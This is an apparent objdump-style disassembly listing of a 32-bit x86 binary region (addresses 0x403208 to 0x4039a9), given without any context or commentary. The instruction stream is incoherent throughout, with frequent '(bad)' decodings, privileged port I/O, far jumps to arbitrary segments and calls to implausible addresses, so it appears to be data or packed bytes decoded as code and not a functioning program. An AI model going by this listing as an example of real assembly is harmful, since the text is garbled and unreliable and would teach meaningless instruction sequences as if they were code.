  403208:	cmp    dh,BYTE PTR [ebp+0x43]
  40320b:	pop    es
  40320c:	sbb    BYTE PTR [ebx],bh
  40320e:	sti    
  40320f:	out    dx,al
  403210:	(bad)  
  403212:	pusha  
  403213:	test   al,0xa
  403215:	mov    es,ebx
  403217:	(bad)
  40321b:	repz sti 
  40321d:	mov    esp,0x3ebfb69b
  403222:	dec    ecx
  403223:	(bad)  
  403224:	es je  0x4031ce
  403227:	pushf  
  403228:	loopne 0x4031d4
  40322a:	xor    al,0x3a
  40322c:	lods   al,BYTE PTR ds:[esi]
  40322d:	pop    esp
  40322e:	adc    esi,DWORD PTR [eax]
  403230:	add    cl,dh
  403232:	sbb    al,0x78
  403234:	mov    dl,0x2d
  403236:	adc    al,0x23
  403238:	mov    eax,ds:0xeec82a93
  40323d:	jnp    0x4031f3
  40323f:	and    eax,0x7d7d0d3f
  403244:	mov    ch,0x79
  403246:	mov    fs,WORD PTR [esp+edx*2-0x24]
  40324a:	jg     0x403271
  40324c:	sub    eax,0xa1c8b280
  403251:	push   0x69
  403253:	(bad)  
  403254:	jae    0x4032ad
  403256:	cdq    
  403257:	mov    DWORD PTR [edi],ebx
  403259:	cld    
  40325a:	outs   dx,BYTE PTR ds:[esi]
  40325b:	stos   DWORD PTR es:[edi],eax
  40325c:	imul   esp,DWORD PTR [edi-0x76],0xffffffe8
  403260:	mov    bl,BYTE PTR [esi+0x6d]
  403263:	sub    edi,DWORD PTR [edi+0x49]
  403266:	arpl   WORD PTR [ecx-0x28],di
  403269:	push   es
  40326a:	cdq    
  40326b:	imul   DWORD PTR [edi+0x79]
  40326e:	stos   BYTE PTR es:[edi],al
  40326f:	idiv   DWORD PTR [edi]
  403271:	xchg   esi,eax
  403272:	sub    eax,0xf536a820
  403277:	mov    esp,0x6cfdab67
  40327c:	sub    DWORD PTR [edx],esi
  40327e:	scas   eax,DWORD PTR es:[edi]
  40327f:	loope  0x4032ae
  403281:	(bad)  
  403282:	out    0x2b,al
  403284:	idiv   ah
  403286:	(bad)  
  403288:	pushf  
  403289:	icebp  
  40328a:	(bad)  
  40328b:	std    
  40328c:	sbb    BYTE PTR [edx+ebp*2-0x51],0x4c
  403291:	dec    ebp
  403292:	les    ebp,FWORD PTR [esi+edx*4]
  403295:	in     eax,0x45
  403297:	inc    esi
  403298:	mov    bl,0x3f
  40329a:	sti    
  40329b:	in     al,0x79
  40329d:	push   ebx
  40329e:	repnz in al,dx
  4032a0:	and    al,0x6e
  4032a2:	in     eax,dx
  4032a3:	cmp    al,0xdc
  4032a5:	scas   eax,DWORD PTR es:[edi]
  4032a6:	push   eax
  4032a7:	test   al,0xb7
  4032a9:	aaa    
  4032aa:	mov    al,0x1
  4032ac:	sub    al,0x90
  4032ae:	dec    esp
  4032af:	cdq    
  4032b0:	dec    ecx
  4032b1:	push   eax
  4032b2:	adc    dl,BYTE PTR [edx+0xf]
  4032b5:	pop    ebx
  4032b6:	dec    esi
  4032b7:	mov    al,gs:0x42f1bbe5
  4032bd:	jo     0x40330f
  4032bf:	jne    0x40327e
  4032c1:	add    ebx,DWORD PTR [ebx+0x63d040a]
  4032c7:	out    dx,al
  4032c8:	scas   eax,DWORD PTR es:[edi]
  4032c9:	mov    bh,0x60
  4032cb:	cmp    al,bl
  4032cd:	mov    ebx,0x79ce9637
  4032d2:	data16 sub bh,BYTE PTR [ebp+0x4c323764]
  4032d9:	add    DWORD PTR [ebx-0x37],ebx
  4032dc:	sti    
  4032dd:	xchg   esi,eax
  4032de:	sbb    bl,BYTE PTR [edi+0x7a]
  4032e1:	cmp    eax,0x418963d8
  4032e6:	pushf  
  4032e7:	mov    dl,0x99
  4032e9:	xchg   esp,eax
  4032ea:	jnp    0x40329e
  4032ec:	leave  
  4032ed:	imul   esi,eax,0x1941a073
  4032f3:	iret   
  4032f4:	xor    eax,0x595a3f3c
  4032f9:	xor    BYTE PTR fs:[ecx-0x5d],ah
  4032fd:	mov    ds:0xc4f1f308,al
  403302:	into   
  403303:	sub    ecx,ecx
  403305:	xor    ch,BYTE PTR [eax+ecx*2-0x4402f3ed]
  40330c:	jg     0x4032a4
  40330e:	std    
  40330f:	xor    edi,eax
  403311:	das    
  403312:	mov    eax,ds:0x8e641439
  403317:	sti    
  403318:	jne    0x403378
  40331a:	sub    al,0xc0
  40331c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40331d:	jge    0x403359
  40331f:	jmp    0xebd4:0x18fd9f6e
  403326:	pop    ebp
  403327:	shl    DWORD PTR [ecx+ecx*2],1
  40332a:	mov    eax,0x7b5dc313
  40332f:	inc    ebp
  403330:	stos   BYTE PTR es:[edi],al
  403331:	xor    al,0x99
  403333:	xor    bh,BYTE PTR [esi-0x3c]
  403336:	cli    
  403337:	stos   DWORD PTR es:[edi],eax
  403338:	sbb    BYTE PTR [edi-0x71],0x4e
  40333c:	mov    dh,0xa1
  40333e:	or     BYTE PTR [esi],ah
  403340:	jne    0x403301
  403342:	mov    edi,0xf4758396
  403347:	and    BYTE PTR [edx-0x1db1af06],ch
  40334d:	pop    edx
  40334e:	jecxz  0x4033c2
  403350:	xor    WORD PTR ds:0xa1269886,0x57
  403358:	mov    ebp,0x6f87c419
  40335d:	push   esi
  40335e:	pop    ebp
  40335f:	pop    eax
  403360:	sbb    ecx,0xffffff86
  403363:	lahf   
  403364:	shr    BYTE PTR [eax+0x0],1
  403367:	xlat   BYTE PTR ds:[ebx]
  403368:	cmp    bl,BYTE PTR [ebx]
  40336a:	pop    ecx
  40336b:	adc    BYTE PTR [ecx],0x2a
  40336e:	or     bl,BYTE PTR [edi]
  403370:	xchg   ebx,eax
  403371:	xchg   esp,eax
  403372:	xchg   ebp,eax
  403373:	xchg   esi,eax
  403374:	frstor [eax+0x30]
  403377:	mov    esp,0x580f52b7
  40337c:	jns    0x40331b
  40337e:	arpl   WORD PTR [ebx],bx
  403380:	jae    0x4033c3
  403382:	xor    DWORD PTR [esp+ebp*8-0xf],edx
  403386:	adc    BYTE PTR [ecx-0x7f4a7d6e],al
  40338c:	push   es
  40338d:	out    0x13,eax
  40338f:	in     eax,0x62
  403391:	pop    ds
  403392:	ins    DWORD PTR es:[edi],dx
  403393:	call   0xc9839efc
  403398:	push   0x7a0454dd
  40339d:	in     al,dx
  40339e:	sub    esi,DWORD PTR [eax+0x4587418]
  4033a4:	pop    ebx
  4033a5:	fldcw  WORD PTR [ebx+ebx*8]
  4033a8:	sub    esp,DWORD PTR [esi-0x41]
  4033ab:	pusha  
  4033ac:	shl    DWORD PTR [ecx+0x44c8c29d],cl
  4033b2:	(bad)  
  4033b4:	ror    DWORD PTR [edi],0xca
  4033b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033b8:	mov    esp,0xcd97d99
  4033bd:	inc    edi
  4033be:	ret    
  4033bf:	lds    ebx,FWORD PTR [esi-0x59]
  4033c2:	push   edi
  4033c3:	je     0x403440
  4033c5:	(bad)  
  4033c6:	int3   
  4033c7:	mov    eax,0x3bf6625a
  4033cc:	and    DWORD PTR [ecx+0x182d94d4],edi
  4033d2:	sbb    BYTE PTR cs:[ebp+eax*1+0x54],dh
  4033d7:	mov    ds:0x20430c2d,al
  4033dc:	dec    esp
  4033dd:	push   ecx
  4033de:	mov    edi,0x7f0861f4
  4033e3:	push   esp
  4033e4:	xchg   edx,eax
  4033e5:	adc    ah,bh
  4033e7:	scas   al,BYTE PTR es:[edi]
  4033e8:	or     DWORD PTR [ecx],ebx
  4033ea:	cdq    
  4033eb:	adc    eax,0xe76e4a80
  4033f0:	mov    eax,ds:0x724515c3
  4033f5:	xor    eax,0xc0fd49ae
  4033fa:	in     eax,0x2d
  4033fc:	jbe    0x403380
  4033fe:	retf   
  4033ff:	and    ebp,DWORD PTR [edi]
  403401:	ficomp WORD PTR [eax-0x4b104f3e]
  403407:	out    dx,al
  403408:	repz je 0x4033f3
  40340b:	adc    dh,BYTE PTR [eax+esi*1+0x761df54e]
  403412:	icebp  
  403413:	lock and DWORD PTR [eax-0x3a00afb],ebx
  40341a:	push   cs
  40341b:	mov    edi,0xd4e9ba9
  403420:	daa    
  403421:	clc    
  403422:	jecxz  0x403449
  403424:	push   ds
  403425:	popf   
  403426:	aaa    
  403427:	inc    ebp
  403428:	inc    edx
  403429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40342a:	sub    ch,BYTE PTR ds:0x97e220f1
  403430:	push   esp
  403431:	inc    edi
  403432:	loopne 0x4033e9
  403434:	shr    DWORD PTR [ebp*4+0x38774c33],1
  40343b:	test   DWORD PTR [edi],edx
  40343d:	outs   dx,DWORD PTR ds:[esi]
  40343e:	mov    dl,0xa5
  403440:	sahf   
  403441:	add    ebp,DWORD PTR [ebx-0x20]
  403444:	mov    ah,0x53
  403446:	or     eax,0x26e41df5
  40344b:	mov    bh,0x66
  40344d:	dec    esi
  40344e:	jecxz  0x403432
  403450:	mov    edx,0x652baf2e
  403455:	mov    esi,0xcb0d383d
  40345a:	jecxz  0x403471
  40345c:	(bad)  
  40345d:	sub    esp,DWORD PTR [edx]
  40345f:	fist   DWORD PTR [edi]
  403461:	push   0x4681faaf
  403466:	cmp    bl,BYTE PTR [edx-0x1e7ab14a]
  40346c:	pop    ds
  40346d:	test   BYTE PTR [edi+0x2acadcfe],dl
  403473:	int3   
  403474:	jb     0x403483
  403476:	pusha  
  403477:	fwait
  403478:	jmp    0x403473
  40347a:	hlt    
  40347b:	arpl   WORD PTR [edx],dx
  40347d:	and    BYTE PTR [ecx],ch
  40347f:	push   edi
  403480:	jge    0x403452
  403482:	dec    edx
  403483:	enter  0x60ca,0x7
  403487:	(bad)  
  403488:	xor    BYTE PTR [edx-0x5c],cl
  40348b:	inc    ebp
  40348c:	(bad)  
  40348d:	ror    BYTE PTR [ebx],0xa2
  403490:	adc    BYTE PTR [ebx],bl
  403492:	(bad)  
  403493:	hlt    
  403494:	je     0x4034ce
  403496:	icebp  
  403497:	test   ebx,eax
  403499:	imul   eax,DWORD PTR [ebx-0x2b0c2e87],0xffffff94
  4034a0:	(bad)  
  4034a1:	stc    
  4034a2:	pop    esp
  4034a3:	aam    0x1e
  4034a5:	mov    esi,0x5e10a913
  4034aa:	or     BYTE PTR [edi+0x5b598efa],dh
  4034b0:	jne    0x403481
  4034b2:	pushf  
  4034b3:	xor    BYTE PTR [edi-0x1c],dl
  4034b6:	repnz (bad) 
  4034b8:	(bad)  ds:0x9042b384
  4034be:	push   esi
  4034bf:	cmp    eax,0x30e29bb7
  4034c4:	mov    ds:0x7329ef7,al
  4034c9:	ret    
  4034ca:	push   ebx
  4034cb:	xchg   BYTE PTR [edx+0x6a],ah
  4034ce:	mov    dl,0xa1
  4034d0:	mov    eax,ds:0xad888e63
  4034d5:	inc    ebp
  4034d6:	call   0x33f16be4
  4034db:	cdq    
  4034dc:	cmc    
  4034dd:	add    al,0x39
  4034df:	test   al,0xec
  4034e1:	ret    0x9597
  4034e4:	push   es
  4034e5:	mov    DWORD PTR [esi],eax
  4034e7:	and    al,0x54
  4034e9:	inc    edx
  4034ea:	out    0xc4,al
  4034ec:	nop
  4034ed:	(bad)  
  4034ef:	out    0x8f,eax
  4034f1:	ret    
  4034f2:	dec    ecx
  4034f3:	xor    BYTE PTR [ebp+0x1bac05a3],ch
  4034f9:	jmp    0x9d7a:0x98e7739a
  403500:	xor    BYTE PTR [eax-0xd9678e5],ch
  403506:	mov    dh,0xac
  403508:	call   0x66979791
  40350d:	pop    edi
  40350e:	pop    ecx
  40350f:	in     eax,dx
  403510:	ja     0x4034e0
  403512:	sub    cl,ah
  403514:	jb     0x403588
  403516:	xchg   edx,eax
  403517:	mov    DWORD PTR [edx+eiz*1-0x23],esi
  40351b:	xor    BYTE PTR [edx+0xc],bh
  40351e:	pop    esi
  40351f:	call   0xde6ae9b1
  403524:	or     ch,dh
  403526:	mov    eax,0x85d572d5
  40352b:	test   DWORD PTR [esi+0x52],esi
  40352e:	adc    al,0x3f
  403530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403531:	es icebp 
  403533:	rcl    eax,cl
  403535:	xor    al,0x54
  403537:	jecxz  0x403514
  403539:	stc    
  40353a:	pop    eax
  40353b:	add    al,0x95
  40353d:	mov    dh,0x8d
  40353f:	das    
  403540:	sti    
  403541:	and    DWORD PTR [eax],eax
  403543:	std    
  403544:	cmp    ebx,DWORD PTR [eax]
  403546:	enter  0xfbc5,0x45
  40354a:	lods   al,BYTE PTR ds:[esi]
  40354b:	jne    0x403573
  40354d:	xor    ecx,DWORD PTR [edx-0x37]
  403550:	mov    ch,0x83
  403552:	push   cs
  403553:	and    dh,cl
  403555:	test   DWORD PTR [ebx-0x320b204e],ecx
  40355b:	dec    ebx
  40355c:	mov    eax,ds:0xbe17d4c8
  403561:	repz and al,0x3f
  403564:	cmp    DWORD PTR [esi+0x201b06a0],ebp
  40356a:	cmp    eax,0xf16a4e1a
  40356f:	adc    BYTE PTR [edi],ch
  403571:	pop    esi
  403572:	pop    eax
  403573:	in     al,0xed
  403575:	in     eax,0xae
  403577:	jmp    0x6ecf26a3
  40357c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40357d:	cmc    
  40357e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40357f:	dec    ebp
  403580:	sbb    eax,0xd74fc240
  403585:	pop    edi
  403586:	(bad)  
  403587:	fwait
  403588:	cmp    BYTE PTR [edx-0x24af2f90],dl
  40358e:	call   0x667c:0x3dc5a436
  403595:	and    ch,bh
  403597:	pop    esp
  403598:	ds jo  0x40352c
  40359b:	rcl    DWORD PTR [ecx-0x4269c29b],1
  4035a1:	outs   dx,DWORD PTR ds:[esi]
  4035a2:	dec    ebp
  4035a3:	mov    DWORD PTR [esi+ecx*8],ebp
  4035a6:	fwait
  4035a7:	mov    BYTE PTR ds:0x98a1995,cl
  4035ad:	imul   DWORD PTR [ecx]
  4035af:	ins    DWORD PTR es:[edi],dx
  4035b0:	mov    al,ds:0x15591979
  4035b5:	push   esi
  4035b6:	jnp    0x403597
  4035b8:	add    BYTE PTR [ecx-0x7c],bh
  4035bb:	popf   
  4035bc:	enter  0xa714,0x8b
  4035c0:	loope  0x4035ab
  4035c2:	mov    bl,BYTE PTR [ecx-0x6082bb56]
  4035c8:	sub    al,bl
  4035ca:	call   0x58d2a24
  4035cf:	adc    al,0xc7
  4035d1:	jp     0x4035ab
  4035d3:	mov    al,ds:0x3ead7531
  4035d8:	outs   dx,DWORD PTR ds:[esi]
  4035d9:	xor    al,0xe8
  4035db:	loope  0x40360f
  4035dd:	adc    esp,DWORD PTR [edi+edi*2+0x6fc180c]
  4035e4:	add    al,0xa0
  4035e6:	pop    edi
  4035e7:	imul   ecx,edi,0x3f
  4035ea:	push   0x6f
  4035ec:	sub    eax,0x3d5657e1
  4035f1:	lods   eax,DWORD PTR ds:[esi]
  4035f2:	dec    esp
  4035f3:	sbb    ah,BYTE PTR ds:0x946cfe67
  4035f9:	(bad)  
  4035fa:	push   esi
  4035fb:	cmp    ebx,0xffffff8d
  4035fe:	iret   
  4035ff:	adc    eax,0xf0d2ff3e
  403604:	inc    ebx
  403605:	stc    
  403606:	ror    bl,0x27
  403609:	add    eax,0xac4160c5
  40360e:	inc    edi
  40360f:	or     dh,BYTE PTR [esi+0x7]
  403612:	jbe    0x4035cc
  403614:	push   ss
  403615:	fld    QWORD PTR [esi]
  403617:	sbb    BYTE PTR [eax+0x2e09f6e1],dl
  40361d:	push   edx
  40361e:	cmp    al,0xf0
  403620:	es sbb al,0x2c
  403623:	cmp    eax,edx
  403625:	sbb    eax,0x90d7eb59
  40362a:	mov    eax,esp
  40362c:	lds    edi,FWORD PTR [ebp+eiz*1-0x20a08aae]
  403633:	fwait
  403634:	inc    eax
  403635:	pop    ss
  403636:	dec    BYTE PTR [ecx]
  403638:	sahf   
  403639:	jmp    0x4ef6:0xcd23e6f0
  403640:	and    esp,DWORD PTR [ebx+0x25]
  403643:	cmp    eax,0x4e38ee8f
  403648:	aam    0x91
  40364a:	inc    esp
  40364b:	(bad)  
  40364d:	pop    ebx
  40364e:	cmp    esi,eax
  403650:	out    0x67,eax
  403652:	or     al,0xba
  403654:	jmp    0x40364c
  403656:	and    esp,ebx
  403658:	pop    ebp
  403659:	hlt    
  40365a:	sbb    eax,0x8a68472c
  40365f:	push   ebx
  403661:	scas   eax,DWORD PTR es:[edi]
  403662:	pop    ecx
  403663:	jo     0x4036b0
  403665:	scas   eax,DWORD PTR es:[edi]
  403666:	sbb    DWORD PTR [ebp-0x18af27ea],esi
  40366c:	push   esp
  40366d:	add    esi,ebp
  40366f:	pusha  
  403670:	fs icebp 
  403672:	inc    esp
  403673:	xor    esp,DWORD PTR [eax-0x28]
  403676:	xlat   BYTE PTR ds:[ebx]
  403677:	repnz fwait
  403679:	out    0xe8,eax
  40367b:	mov    BYTE PTR [ebx+ecx*4],cl
  40367e:	inc    eax
  40367f:	adc    eax,0x6da2c55d
  403684:	jl     0x4036a4
  403686:	hlt    
  403687:	mov    esi,0xcf980ef
  40368c:	pushf  
  40368d:	xchg   cl,ah
  40368f:	out    0x98,al
  403691:	lea    ebp,[edx+ebp*2]
  403694:	push   edx
  403695:	mov    DWORD PTR [eax+edx*4-0x52],edi
  403699:	jecxz  0x403625
  40369b:	inc    eax
  40369c:	shr    BYTE PTR [edx],cl
  40369e:	inc    edx
  40369f:	cmpxchg8b (bad)
  4036a0:	(bad)  
  4036a1:	iret   
  4036a2:	jle    0x403718
  4036a4:	test   DWORD PTR [eax],edi
  4036a6:	xchg   bh,bh
  4036a8:	mov    edi,0xe5b40a96
  4036ad:	and    dl,ah
  4036af:	pop    ebx
  4036b0:	fisubr WORD PTR [eax]
  4036b2:	enter  0xdb58,0x6f
  4036b6:	dec    DWORD PTR [eax]
  4036b8:	js     0x4036e8
  4036ba:	lods   al,BYTE PTR ds:[esi]
  4036bb:	clc    
  4036bc:	or     eax,0x3b18606b
  4036c1:	cmp    BYTE PTR [eax-0x7],dh
  4036c4:	fs lahf 
  4036c6:	stos   DWORD PTR es:[edi],eax
  4036c7:	lds    edi,FWORD PTR [esi+ecx*1]
  4036ca:	sbb    DWORD PTR [eax+0x5f],esp
  4036cd:	sub    eax,ecx
  4036cf:	xchg   esp,eax
  4036d0:	call   0xcb693e3a
  4036d5:	loopne 0x4036a6
  4036d7:	pop    es
  4036d8:	jmp    0xac0e:0x29c7b8de
  4036df:	xchg   ecx,eax
  4036e0:	(bad)  
  4036e1:	scas   al,BYTE PTR es:[edi]
  4036e2:	push   esp
  4036e3:	(bad)  
  4036e4:	pop    ebp
  4036e5:	test   DWORD PTR [esi-0x51],ecx
  4036e8:	in     al,0xe0
  4036ea:	(bad)  
  4036eb:	xor    ah,BYTE PTR [edi-0x47]
  4036ee:	ja     0x403736
  4036f0:	fisub  WORD PTR [eax]
  4036f2:	(bad)  
  4036f3:	in     eax,0xcb
  4036f5:	jo     0x4036a7
  4036f7:	pop    DWORD PTR [ebp-0x34d3de5c]
  4036fd:	pop    esp
  4036fe:	jmp    0xf7e04cc0
  403703:	inc    edi
  403704:	cmp    eax,0x6f1b9c24
  403709:	adc    esi,DWORD PTR [ebx+0x63f3c638]
  40370f:	add    eax,0xbf79fbbb
  403714:	xor    DWORD PTR [esp+edx*8],0x7744f1f
  40371b:	mov    bl,0xd4
  40371d:	mov    ds:0x6657b16,al
  403722:	repnz std 
  403724:	add    al,0x2d
  403726:	xchg   ebx,eax
  403727:	mov    esp,0xad9e6664
  40372c:	mov    ebp,DWORD PTR [edx]
  40372e:	outs   dx,BYTE PTR ds:[esi]
  40372f:	push   0xffffffb6
  403731:	push   es
  403732:	and    al,0xa7
  403734:	(bad)  
  403735:	mov    eax,0x79896f84
  40373a:	mov    ebp,0x60298dd6
  40373f:	sub    DWORD PTR [esi-0x2c56e456],0xffffff98
  403746:	mov    al,ds:0x2449b657
  40374b:	cwde   
  40374c:	fistp  QWORD PTR [edx-0x74]
  40374f:	jnp    0x40376c
  403751:	in     al,0x75
  403753:	js     0x4037ae
  403755:	aad    0x40
  403757:	xchg   edi,eax
  403758:	jl     0x403739
  40375a:	push   es
  40375b:	psllw  mm7,QWORD PTR [ecx+eax*4]
  40375f:	xor    BYTE PTR [edx],cl
  403761:	icebp  
  403762:	dec    ebp
  403763:	dec    esi
  403764:	cwde   
  403765:	das    
  403766:	dec    edx
  403767:	(bad)  
  403768:	clc    
  403769:	jl     0x40375a
  40376b:	loope  0x403796
  40376d:	cmp    esp,esp
  40376f:	into   
  403770:	lock pop eax
  403772:	fcmove st,st(2)
  403774:	mov    bl,0x33
  403776:	repnz xor edx,0xffffff85
  40377a:	push   cs
  40377b:	xor    al,0x3d
  40377d:	mov    ebp,0xb16646b1
  403782:	out    dx,eax
  403783:	fadd   st,st(7)
  403785:	mov    edx,0x79912367
  40378a:	stos   DWORD PTR es:[edi],eax
  40378b:	pushf  
  40378c:	sbb    edx,DWORD PTR [edx]
  40378e:	ds or  al,0x7e
  403791:	ficomp DWORD PTR [edi-0x4f]
  403794:	outs   dx,DWORD PTR ds:[esi]
  403795:	xchg   esp,eax
  403796:	mov    ch,0x10
  403798:	stos   BYTE PTR es:[edi],al
  403799:	pop    ss
  40379a:	daa    
  40379b:	xchg   DWORD PTR [edx],edi
  40379d:	addr16 inc eax
  40379f:	daa    
  4037a0:	ins    BYTE PTR es:[edi],dx
  4037a1:	inc    ecx
  4037a2:	mov    bh,0x3e
  4037a4:	add    al,0x3d
  4037a6:	mov    dl,0x97
  4037a8:	cwde   
  4037a9:	mov    ds:0x4df5f464,al
  4037ae:	push   es
  4037af:	in     eax,0x7d
  4037b1:	dec    esp
  4037b2:	neg    DWORD PTR [ebp+0x42]
  4037b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037b6:	pop    ss
  4037b7:	push   edx
  4037b8:	clc    
  4037b9:	jns    0x4037b2
  4037bb:	aas    
  4037bc:	test   al,0x5e
  4037be:	pop    es
  4037bf:	icebp  
  4037c0:	jp     0x403781
  4037c2:	and    esp,DWORD PTR [edx+0x3e]
  4037c5:	mov    ds:0xd3f62e5b,al
  4037ca:	fnsave [edi]
  4037cc:	jb     0x4037df
  4037ce:	loopne 0x4037b1
  4037d0:	retf   0x5f22
  4037d3:	std    
  4037d4:	popa   
  4037d5:	xchg   ebp,eax
  4037d6:	xor    DWORD PTR [edx-0x13],ebp
  4037d9:	push   esi
  4037da:	add    esi,DWORD PTR [ecx+0x3e]
  4037dd:	imul   ecx,DWORD PTR [ebp-0x69],0x6d
  4037e1:	cwde   
  4037e2:	push   ebp
  4037e3:	aas    
  4037e4:	cmc    
  4037e5:	jge    0x403798
  4037e7:	pop    ss
  4037e8:	lahf   
  4037e9:	ffree  st(4)
  4037eb:	adc    BYTE PTR [ebp+ebx*4-0x5a],0xee
  4037f0:	mov    ds:0xbe9c94dc,eax
  4037f5:	push   ebx
  4037f6:	push   es
  4037f7:	loope  0x4037c2
  4037f9:	mov    dl,0x82
  4037fb:	out    dx,al
  4037fc:	enter  0x56c8,0x27
  403800:	xchg   esi,eax
  403801:	aad    0x3c
  403803:	fistp  DWORD PTR ss:[esi+0x44d62dd6]
  40380a:	(bad)  
  40380b:	jnp    0x4037f9
  40380d:	jp     0x4037aa
  40380f:	mov    bh,BYTE PTR [eax]
  403811:	test   al,0x1b
  403813:	or     edx,ebx
  403815:	cmp    ebx,DWORD PTR ds:0xbd1d714d
  40381b:	int3   
  40381c:	dec    edi
  40381d:	push   edi
  40381e:	out    0x7d,eax
  403820:	xchg   ebp,eax
  403821:	push   esp
  403822:	ror    BYTE PTR [edi+eax*8],1
  403825:	pop    ds
  403826:	push   ebp
  403827:	push   esp
  403828:	lock sub BYTE PTR [eax],bh
  40382b:	cmp    DWORD PTR [eax],ecx
  40382d:	pop    edi
  40382e:	jae    0x403858
  403830:	mov    DWORD PTR [ebx+ecx*1],ebp
  403833:	call   0x2393985e
  403838:	jbe    0x40384e
  40383a:	sbb    ecx,DWORD PTR [ebp-0x542add08]
  403840:	push   ecx
  403841:	mov    bl,0x93
  403843:	mov    ds,WORD PTR [eax]
  403845:	inc    ecx
  403846:	xchg   ebx,eax
  403847:	out    dx,al
  403848:	mov    ebx,0xaed47d15
  40384d:	out    0x44,eax
  40384f:	in     eax,dx
  403850:	push   edi
  403851:	addr16 fwait
  403853:	std    
  403854:	(bad)  [ebx]
  403856:	lea    ebx,[ecx-0x7c30d339]
  40385c:	mov    al,0x7c
  40385e:	shl    al,cl
  403860:	sub    ah,BYTE PTR [ebp+0x60]
  403863:	xor    bl,ah
  403865:	lahf   
  403866:	pop    ecx
  403867:	retf   0x5597
  40386a:	daa    
  40386b:	cmp    eax,0xe435b3fa
  403870:	cli    
  403871:	fstp   QWORD PTR [edi]
  403873:	sub    cl,BYTE PTR [ebx]
  403875:	ror    BYTE PTR [edx],cl
  403877:	clc    
  403878:	xor    dh,0xa2
  40387b:	push   edx
  40387c:	stos   BYTE PTR es:[edi],al
  40387d:	or     edi,eax
  40387f:	adc    ebx,ebp
  403881:	push   cs
  403882:	sahf   
  403883:	add    esp,DWORD PTR [esp+ebx*1]
  403886:	adc    BYTE PTR [esi],0x37
  403889:	popa   
  40388a:	pusha  
  40388b:	pop    edx
  40388c:	pushf  
  40388d:	gs dec ebx
  40388f:	lods   eax,DWORD PTR ds:[esi]
  403890:	pop    ss
  403891:	add    bl,al
  403893:	ret    0x2de1
  403896:	xor    al,0x2e
  403898:	dec    eax
  403899:	hlt    
  40389a:	or     eax,DWORD PTR [ebx+0x3e]
  40389d:	mov    ch,0xb5
  40389f:	sbb    esi,DWORD PTR [eax+ecx*4+0x27621530]
  4038a6:	or     DWORD PTR [esi],ebp
  4038a8:	cmp    eax,0xc4df4b90
  4038ad:	push   edi
  4038ae:	mov    BYTE PTR [edi],dl
  4038b0:	fsub   QWORD PTR [ebx*4+0x74de2c06]
  4038b7:	sbb    ch,bl
  4038b9:	sbb    eax,0xd0d3e20c
  4038be:	push   eax
  4038bf:	std    
  4038c0:	jle    0x4038f9
  4038c2:	(bad)  
  4038c3:	sti    
  4038c4:	sbb    ecx,DWORD PTR [edx-0x41]
  4038c7:	outs   dx,BYTE PTR ds:[esi]
  4038c8:	and    eax,0x2341a167
  4038cd:	fdiv   DWORD PTR [ebx+0x27]
  4038d0:	jmp    0x2f71:0x3edde8ac
  4038d7:	jmp    0x7ea7e51e
  4038dc:	retf   0xc6ac
  4038df:	rcl    esp,1
  4038e1:	mov    eax,ds:0x59d7f555
  4038e6:	dec    eax
  4038e7:	sbb    eax,DWORD PTR [esp+ebp*2+0x1c8f0a7d]
  4038ee:	int    0x44
  4038f0:	adc    DWORD PTR [eax+0x20],ecx
  4038f3:	idiv   DWORD PTR [ebp+0x4558259a]
  4038f9:	mov    esi,0xc4ae0013
  4038fe:	scas   eax,DWORD PTR es:[edi]
  4038ff:	ins    BYTE PTR es:[edi],dx
  403900:	pop    edx
  403901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403902:	std    
  403903:	cmp    al,0x26
  403905:	jns    0x4038b3
  403907:	cli    
  403908:	add    al,0x12
  40390a:	rol    BYTE PTR [ecx-0x68],1
  40390d:	and    BYTE PTR [eax],al
  40390f:	sbb    dl,BYTE PTR [eax]
  403911:	xor    edi,ecx
  403913:	fs mov esp,ebp
  403916:	(bad)  
  403917:	sti    
  403918:	or     BYTE PTR ds:0x2c75dd30,ah
  40391e:	xchg   ebx,eax
  40391f:	in     al,0x95
  403921:	and    dh,BYTE PTR [ecx-0x66d40f]
  403927:	add    DWORD PTR [esi+0x7146ade4],ebx
  40392d:	pop    es
  40392e:	jmp    0x403935
  403930:	das    
  403931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403932:	pusha  
  403933:	dec    ebx
  403934:	call   0xfc58d2bb
  403939:	jmp    0xcce4c3da
  40393e:	mov    esi,0xa695d210
  403943:	add    esi,ebx
  403945:	pop    ds
  403946:	test   al,0xb1
  403948:	add    al,0x7d
  40394a:	aas    
  40394b:	and    eax,0x3e58d62b
  403950:	pop    ecx
  403951:	lods   al,BYTE PTR ds:[si]
  403953:	hlt    
  403954:	(bad)  
  403955:	clc    
  403956:	(bad)  
  403958:	xor    BYTE PTR [esi+0x24],cl
  40395b:	lods   al,BYTE PTR ds:[esi]
  40395c:	jae    0x403999
  40395e:	xchg   esp,eax
  40395f:	(bad)  
  403960:	stos   BYTE PTR es:[edi],al
  403961:	iret   
  403962:	scas   al,BYTE PTR es:[edi]
  403963:	es xor al,0xc2
  403966:	lods   al,BYTE PTR ds:[si]
  403968:	scas   eax,DWORD PTR es:[edi]
  403969:	cwde   
  40396a:	cld    
  40396b:	addr16 mov ds:0xbabd,eax
  40396f:	sub    BYTE PTR [edi+0x1e],cl
  403972:	mov    al,0x20
  403974:	mov    dl,0xda
  403976:	cs out dx,eax
  403978:	(bad)  
  403979:	(bad)  
  40397b:	and    BYTE PTR [ecx],bh
  40397d:	xchg   ebx,eax
  40397e:	mov    dh,0xd4
  403980:	test   BYTE PTR [esi+eiz*1+0x6d],dh
  403984:	push   esp
  403985:	daa    
  403986:	daa    
  403987:	jne    0x40395a
  403989:	in     al,0x17
  40398b:	cld    
  40398c:	fst    st(3)
  40398e:	jmp    0x7bfaad4e
  403993:	cmp    BYTE PTR [eax],ah
  403995:	inc    eax
  403996:	retf   
  403997:	repnz fiadd DWORD PTR [ecx-0x5a]
  40399b:	adc    eax,0x267264b9
  4039a0:	cwde   
  4039a1:	xchg   ebx,eax
  4039a2:	push   edx
  4039a3:	sbb    edx,DWORD PTR [edx+0x24532050]
  4039a9:	push   ebp
